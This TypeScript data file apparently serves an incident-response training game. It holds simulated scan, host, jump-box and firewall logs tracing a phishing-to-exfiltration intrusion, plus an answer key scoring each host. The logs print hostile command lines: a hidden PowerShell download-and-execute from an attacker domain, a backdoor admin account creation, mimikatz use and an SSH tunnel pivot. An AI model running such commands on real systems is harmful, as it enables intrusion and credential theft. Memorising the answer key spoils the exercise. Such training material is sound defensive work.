import type { DeviceLog, DeviceStatus } from '../../types/device';

// Device logs with subtle but detectable attack indicators
export const deviceLogs: Record<string, DeviceLog> = {
  // ORIGIN POINT - Requires analysis to spot the initial compromise
  'eng-ws-03': {
    title: 'ENG-WS-03 - Vulnerability Scan & System Log',
    timestamp: '2025-08-19T14:25:32Z',
    content: `=== VULNERABILITY SCAN RESULTS ===
Scan Date: 2025-08-19 14:25:32
Target: ENG-WS-03 (192.168.10.15)
Scanner: Nessus Professional

CRITICAL VULNERABILITIES:
- None detected

HIGH VULNERABILITIES:
- CVE-2023-28252: Windows Common Log File System (Minor - patched)

MEDIUM VULNERABILITIES:
- CVE-2024-21412: Internet Explorer Memory Corruption (Not exploitable - IE disabled)
- Outdated browser plugins detected (Flash Player 32.0.0.453)

LOW VULNERABILITIES:
- Weak SMB signing configuration
- Anonymous FTP access enabled (intentional for dev environment)

=== SYSTEM EVENT LOG ===
2025-08-19 12:47:23 [INFO] Email received: sender=it-security@techcorp-updates.com
2025-08-19 12:47:25 [INFO] Outlook: Message moved to Inbox
2025-08-19 13:15:18 [INFO] Process started: chrome.exe --url=hxxps://secure-portal-update[.]techcorp-auth[.]com/verify
2025-08-19 13:15:45 [WARN] Certificate validation failed: secure-portal-update.techcorp-auth.com
2025-08-19 13:15:47 [INFO] User clicked "Proceed anyway" on certificate warning
2025-08-19 13:16:12 [INFO] Form submission: username=j.mitchell, password=[HIDDEN]
2025-08-19 13:16:18 [INFO] Process started: powershell.exe -WindowStyle Hidden -Command "iex (New-Object Net.WebClient).DownloadString('hxxps://cdn-updates[.]techcorp-auth[.]com/ps1')"
2025-08-19 13:16:22 [INFO] Network connection: 192.168.10.15 -> 185.234.72.118:443 (SSL)
2025-08-19 13:16:35 [INFO] File created: C:\\Users\\jmitchell\\AppData\\Local\\Temp\\sys_update.tmp
2025-08-19 13:16:36 [INFO] Registry modified: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
2025-08-19 13:22:15 [INFO] Network connection: 192.168.10.15 -> 192.168.1.10:22 (SSH attempt)
2025-08-19 13:45:33 [INFO] Process: explorer.exe accessing network shares
2025-08-19 14:03:47 [INFO] Network connection: 192.168.10.15 -> 192.168.20.5:445 (SMB)

=== NETWORK ACTIVITY ===
Outbound connections (last 2 hours):
- Multiple HTTPS requests to legitimate Microsoft domains
- DNS queries for techcorp-auth.com (suspicious - not corporate domain)
- SSH connection attempts to jump box (192.168.1.10)
- SMB connections to R&D subnet (192.168.20.0/24)`
  },

  // INFECTED SYSTEM - Clear malware presence but mixed with legitimate activity
  'eng-ws-07': {
    title: 'ENG-WS-07 - Vulnerability Scan & System Log',
    timestamp: '2025-08-19T14:26:15Z',
    content: `=== VULNERABILITY SCAN RESULTS ===
Scan Date: 2025-08-19 14:26:15
Target: ENG-WS-07 (192.168.10.19)
Scanner: Nessus Professional

CRITICAL VULNERABILITIES:
- Suspicious process detected: svchosts.exe (note the 's' - legitimate is svchost.exe)
- Unauthorized network services running on ports 4444, 8080

HIGH VULNERABILITIES:
- CVE-2024-26169: Windows LDAP Remote Code Execution (UNPATCHED)
- Backdoor communication detected to external IP
- Modified system files detected in C:\\Windows\\System32

MEDIUM VULNERABILITIES:
- Unusual PowerShell execution patterns
- Registry tampering detected
- Suspicious scheduled tasks

=== SYSTEM EVENT LOG ===
2025-08-19 13:52:18 [INFO] System boot completed
2025-08-19 13:52:35 [WARN] Service failed to start: Windows Update (likely disabled)
2025-08-19 13:53:12 [INFO] Process started: svchosts.exe (SUSPICIOUS - extra 's')
2025-08-19 13:53:15 [ERROR] Windows Defender: Real-time protection disabled
2025-08-19 13:53:22 [INFO] Network service listening on port 4444
2025-08-19 14:02:33 [INFO] Scheduled task created: "\\Microsoft\\Windows\\UpdateChecker"
2025-08-19 14:02:45 [WARN] PowerShell execution: Base64 encoded command detected
2025-08-19 14:03:12 [INFO] File modification: C:\\Windows\\System32\\drivers\\etc\\hosts
2025-08-19 14:05:44 [INFO] Process: cmd.exe /c "net user admin P@ssw0rd123 /add"
2025-08-19 14:05:47 [INFO] Process: net localgroup administrators admin /add
2025-08-19 14:12:18 [INFO] Network connection: 192.168.10.19 -> 45.133.203.92:443 (C2 server)
2025-08-19 14:15:33 [WARN] Multiple login failures for user: admin
2025-08-19 14:22:07 [INFO] File access: sensitive_project_files.zip

=== BEHAVIORAL ANALYSIS ===
- Persistence mechanism: Registry Run key modification
- Lateral movement: SMB scanning of internal subnets
- Data staging: Files copied to C:\\temp\\exfil\\
- Command & Control: Regular beacons to 45.133.203.92`
  },

  // CLEAN SYSTEM - Normal activity with some red herrings
  'eng-ws-12': {
    title: 'ENG-WS-12 - Vulnerability Scan & System Log',
    timestamp: '2025-08-19T14:27:02Z',
    content: `=== VULNERABILITY SCAN RESULTS ===
Scan Date: 2025-08-19 14:27:02
Target: ENG-WS-12 (192.168.10.23)
Scanner: Nessus Professional

CRITICAL VULNERABILITIES:
- None detected

HIGH VULNERABILITIES:
- None detected

MEDIUM VULNERABILITIES:
- CVE-2024-21351: Windows Print Spooler (Patched but service still running)
- SMB signing not enforced (corporate standard allows this)

LOW VULNERABILITIES:
- Outdated Java version (8u371) - scheduled for update next week
- Guest account enabled but disabled (standard config)

=== SYSTEM EVENT LOG ===
2025-08-19 08:30:15 [INFO] System boot: Normal startup
2025-08-19 08:30:45 [INFO] User logon: s.chen (Engineering)
2025-08-19 09:15:22 [INFO] Application started: AutoCAD 2024
2025-08-19 09:45:33 [INFO] Network connection: File server access (\\\\fileserver01\\engineering)
2025-08-19 10:22:14 [INFO] Print job submitted: 15 pages
2025-08-19 11:30:00 [INFO] Automatic updates: Check completed, no updates available
2025-08-19 12:00:15 [INFO] User locked workstation
2025-08-19 13:15:22 [INFO] User unlocked workstation
2025-08-19 13:16:33 [INFO] Email check: Exchange server sync
2025-08-19 13:45:18 [WARN] Failed to connect to printer (network printer offline)
2025-08-19 14:12:05 [INFO] Application closed: AutoCAD 2024
2025-08-19 14:22:33 [INFO] Network connection: \\\\fileserver01\\shared (backup operation)

=== NETWORK ACTIVITY ===
All connections within expected parameters:
- Exchange email synchronization
- File server access (legitimate)
- Windows Update checks
- Printer network traffic
- No external connections detected`
  },

  // R&D INFECTED SYSTEM - Secondary compromise
  'rd-ws-05': {
    title: 'RD-WS-05 - Vulnerability Scan & System Log',
    timestamp: '2025-08-19T14:28:45Z',
    content: `=== VULNERABILITY SCAN RESULTS ===
Scan Date: 2025-08-19 14:28:45
Target: RD-WS-05 (192.168.20.8)
Scanner: Nessus Professional

CRITICAL VULNERABILITIES:
- Active network scanning tools detected
- Privilege escalation artifacts found
- Suspicious network tunneling activity

HIGH VULNERABILITIES:
- Credential dumping tools present: mimikatz.exe
- Lateral movement indicators: PsExec usage
- Data exfiltration staging area detected

MEDIUM VULNERABILITIES:
- PowerShell logging disabled (recently modified)
- Windows Event Log service stopped
- Firewall rules modified

=== SYSTEM EVENT LOG ===
2025-08-19 14:03:52 [INFO] SMB connection from: 192.168.10.15 (Engineering subnet)
2025-08-19 14:04:15 [WARN] Login attempt: admin account (not local user)
2025-08-19 14:04:18 [INFO] Successful login: admin (suspicious - new account)
2025-08-19 14:04:22 [INFO] Process started: cmd.exe (running as admin)
2025-08-19 14:04:33 [INFO] Process: whoami /priv (privilege enumeration)
2025-08-19 14:04:45 [INFO] Process: net view (network discovery)
2025-08-19 14:05:12 [WARN] Process started: mimikatz.exe
2025-08-19 14:05:18 [INFO] File access: C:\\Windows\\System32\\config\\SAM
2025-08-19 14:06:33 [INFO] Process: powershell.exe -ep bypass (execution policy bypass)
2025-08-19 14:07:15 [WARN] Service stopped: Windows Event Log
2025-08-19 14:08:22 [INFO] Network connection: 192.168.20.8 -> 192.168.20.12:445
2025-08-19 14:12:44 [INFO] File copy operation: Research_Data_Q3.zip -> C:\\temp\\
2025-08-19 14:18:33 [WARN] Large data transfer detected: 2.3GB outbound

=== ATTACK TIMELINE ===
14:03 - Initial SMB connection from compromised ENG-WS-03
14:04 - Lateral movement using harvested credentials  
14:05 - Credential dumping with Mimikatz
14:07 - Log tampering and anti-forensics
14:12 - Data discovery and staging
14:18 - Attempted data exfiltration`
  },

  // CLEAN R&D SYSTEM
  'rd-ws-09': {
    title: 'RD-WS-09 - Vulnerability Scan & System Log',
    timestamp: '2025-08-19T14:29:12Z',
    content: `=== VULNERABILITY SCAN RESULTS ===
Scan Date: 2025-08-19 14:29:12
Target: RD-WS-09 (192.168.20.12)
Scanner: Nessus Professional

CRITICAL VULNERABILITIES:
- None detected

HIGH VULNERABILITIES:
- None detected

MEDIUM VULNERABILITIES:
- Pending Windows security updates (4 updates available)
- Adobe Reader outdated (version 2023.008.20470)

LOW VULNERABILITIES:
- USB storage policy not enforced
- Local admin rights for research user (by design)

=== SYSTEM EVENT LOG ===
2025-08-19 07:45:18 [INFO] System startup: Cold boot
2025-08-19 07:45:52 [INFO] User logon: r.kim (Research Team)
2025-08-19 08:30:14 [INFO] Application started: MATLAB R2024a
2025-08-19 09:15:33 [INFO] File opened: simulation_model_v2.m
2025-08-19 10:22:45 [INFO] Network connection: \\\\nas02\\research_data
2025-08-19 11:30:00 [INFO] Automatic backup: Complete
2025-08-19 12:30:15 [INFO] User logoff: lunch break
2025-08-19 13:30:22 [INFO] User logon: r.kim
2025-08-19 14:08:18 [WARN] SMB connection attempt from 192.168.20.8 (failed authentication)
2025-08-19 14:08:25 [WARN] Multiple failed login attempts from 192.168.20.8
2025-08-19 14:08:33 [INFO] Security policy blocked connection from 192.168.20.8
2025-08-19 14:15:44 [INFO] Email received: IT Security alert about network activity
2025-08-19 14:25:18 [INFO] Application: Antivirus full scan initiated (user request)

=== SECURITY NOTES ===
- This system successfully blocked lateral movement attempts
- Strong authentication policies prevented compromise  
- User immediately reported suspicious activity to IT
- No indicators of compromise detected`
  },

  // JUMP BOX - Shows the pivot point
  'jump-box': {
    title: 'JB-CORE-01 - Authentication & Process Logs',
    timestamp: '2025-08-19T14:30:00Z',
    content: `=== JUMP BOX AUTHENTICATION LOG ===
Host: JB-CORE-01 (192.168.1.10)
Service: SSH Daemon (OpenSSH 8.9)

2025-08-19 13:22:15 [FAIL] Failed password for jmitchell from 192.168.10.15 port 52341 ssh2
2025-08-19 13:22:18 [FAIL] Failed password for jmitchell from 192.168.10.15 port 52341 ssh2
2025-08-19 13:22:22 [FAIL] Failed password for admin from 192.168.10.15 port 52342 ssh2
2025-08-19 13:22:26 [FAIL] Failed password for administrator from 192.168.10.15 port 52343 ssh2
2025-08-19 13:22:30 [FAIL] Failed password for root from 192.168.10.15 port 52344 ssh2
2025-08-19 13:44:55 [FAIL] Failed password for jmitchell from 192.168.10.15 port 52389 ssh2
2025-08-19 13:45:12 [SUCCESS] Accepted password for jmitchell from 192.168.10.15 port 52389 ssh2
2025-08-19 13:45:15 [INFO] User jmitchell logged in from 192.168.10.15
2025-08-19 13:45:22 [INFO] Session started: jmitchell (pts/0)

=== PROCESS EXECUTION LOG ===
2025-08-19 13:45:25 [INFO] Command: whoami
2025-08-19 13:45:28 [INFO] Command: id
2025-08-19 13:45:33 [INFO] Command: sudo -l (privilege check)
2025-08-19 13:45:45 [INFO] Command: ip route show (network reconnaissance)
2025-08-19 13:46:12 [INFO] Command: nmap -sn 192.168.20.0/24 (R&D subnet scan)
2025-08-19 13:46:55 [INFO] Command: ssh-keygen -t rsa (key generation)
2025-08-19 13:47:33 [INFO] SSH connection attempt: 192.168.20.8 (R&D-WS-05)
2025-08-19 13:47:44 [INFO] Command: scp /home/jmitchell/.ssh/id_rsa.pub jmitchell@192.168.20.8:
2025-08-19 14:03:15 [INFO] SSH tunnel established: -L 3389:192.168.20.8:3389
2025-08-19 14:03:52 [INFO] RDP connection initiated through tunnel
2025-08-19 14:04:15 [SUCCESS] RDP login: admin@192.168.20.8

=== NETWORK CONNECTIONS ===
Active connections from JB-CORE-01:
- 192.168.10.15:52389 -> 192.168.1.10:22 (SSH session)
- 192.168.1.10:random -> 192.168.20.8:22 (SSH to R&D)
- 192.168.1.10:3389 -> 192.168.20.8:3389 (RDP tunnel)

=== ANALYSIS NOTES ===
- Initial brute force attack followed by successful login
- Credential likely harvested from ENG-WS-03 compromise
- Jump box used as pivot point for R&D network access
- SSH tunneling employed to bypass network segmentation`
  },

  // FIREWALL - Network traffic analysis
  'firewall': {
    title: 'FW-CORE-01 - Network Traffic Analysis',
    timestamp: '2025-08-19T14:31:00Z',
    content: `=== FIREWALL TRAFFIC LOG ===
Firewall: FW-CORE-01 (Palo Alto PA-3220)
Policy: Corporate_Security_Policy_v2.1

=== SUSPICIOUS OUTBOUND CONNECTIONS ===
2025-08-19 13:16:22 [ALLOW] 192.168.10.15:52234 -> 185.234.72.118:443 (SSL/TLS)
  Policy: Allow_HTTPS_Outbound | App: ssl | Rule: 15
  Certificate: CN=secure-portal-update.techcorp-auth.com (SUSPICIOUS DOMAIN)
  
2025-08-19 13:16:35 [ALLOW] 192.168.10.15:52235 -> 185.234.72.118:443 (SSL/TLS)
  Policy: Allow_HTTPS_Outbound | App: ssl | Rule: 15
  Bytes: 2,847 down, 456 up | Duration: 00:00:13
  
2025-08-19 14:12:18 [ALLOW] 192.168.10.19:51842 -> 45.133.203.92:443 (SSL/TLS)
  Policy: Allow_HTTPS_Outbound | App: ssl | Rule: 15
  C2 PATTERN: Regular 30-second beacons detected
  
2025-08-19 14:18:33 [DENY] 192.168.20.8:49233 -> 93.184.216.34:443 (SSL/TLS)
  Policy: Block_R&D_External | App: ssl | Rule: 8
  Reason: Data exfiltration detected (2.3GB transfer attempt)

=== LATERAL MOVEMENT ANALYSIS ===
2025-08-19 13:22:15 [ALLOW] 192.168.10.15:52341 -> 192.168.1.10:22 (SSH)
  Policy: Allow_Internal_SSH | App: ssh | Rule: 22
  Multiple authentication failures detected
  
2025-08-19 13:45:12 [ALLOW] 192.168.10.15:52389 -> 192.168.1.10:22 (SSH)
  Policy: Allow_Internal_SSH | App: ssh | Rule: 22
  Successful authentication: jmitchell
  
2025-08-19 14:03:52 [ALLOW] 192.168.1.10:45128 -> 192.168.20.8:445 (SMB)
  Policy: Allow_Internal_SMB | App: ms-smb | Rule: 35
  Cross-subnet access: ENG -> R&D (via jump box)
  
2025-08-19 14:08:18 [DENY] 192.168.20.8:49112 -> 192.168.20.12:445 (SMB)
  Policy: Block_Unauthorized_Lateral | App: ms-smb | Rule: 42
  Reason: Suspicious lateral movement pattern

=== THREAT INTELLIGENCE CORRELATION ===
- IP 185.234.72.118: Known phishing infrastructure (Threat Feed: AlienVault)
- IP 45.133.203.92: Suspected C2 server (Threat Feed: VirusTotal)
- Domain techcorp-auth.com: Typosquatting our corporate domain
- Beacon pattern: Matches APT29 TTP (MITRE ATT&CK T1071.001)

=== BLOCKED CONNECTIONS ===
2025-08-19 14:18:33 [DENY] Large data transfer attempt blocked
2025-08-19 14:08:18 [DENY] Unauthorized lateral movement blocked
2025-08-19 14:23:45 [DENY] Additional R&D access attempts blocked

=== NETWORK SEGMENTATION STATUS ===
✓ Engineering to R&D: Blocked (except via authorized jump box)
✓ R&D to Internet: Restricted (data exfiltration prevented)
✗ Jump box controls: Compromised credentials bypassed restrictions`
  }
};

// Correct answers for scoring
export const correctAnswers: Record<string, keyof DeviceStatus> = {
  'eng-ws-03': 'origin',     // Initial phishing victim - subtle indicators
  'eng-ws-07': 'infected',   // Clear malware presence  
  'eng-ws-12': 'clean',      // Normal legitimate activity
  'rd-ws-05': 'infected',    // Lateral movement target
  'rd-ws-09': 'clean'        // Successfully blocked attack
};